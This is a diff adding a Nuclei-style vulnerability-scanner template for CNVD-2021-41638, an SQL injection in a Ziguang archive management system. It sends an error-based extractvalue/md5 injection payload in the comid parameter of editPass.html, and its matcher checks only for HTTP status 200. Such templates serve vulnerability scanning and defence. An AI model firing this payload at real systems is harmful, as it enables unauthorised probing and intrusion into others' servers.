@@ -1,0 +1,21 @@
+id: poc-yaml-ziguang-sqli-cnvd-2021-41638
+
+info:
+  name: poc-yaml-ziguang-sqli-cnvd-2021-41638
+  author: xiaobaicai
+  severity: high
+  tags: xray-converted,sqli,cnvd-2021-41638,ct-456655
+  reference:
+    - http://wiki.peiqi.tech/wiki/webapp/%E7%B4%AB%E5%85%89%E8%BD%AF%E4%BB%B6/%E7%B4%AB%E5%85%89%E6%A1%A3%E6%A1%88%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F%20editPass.html%20SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%20CNVD-2021-41638.html
+
+http:
+  - raw:
+      - |
+        GET /login/Login/editPass.html?comid=extractvalue(1,concat(char(126),md5({{rand_int(1000, 9999)}}))) HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
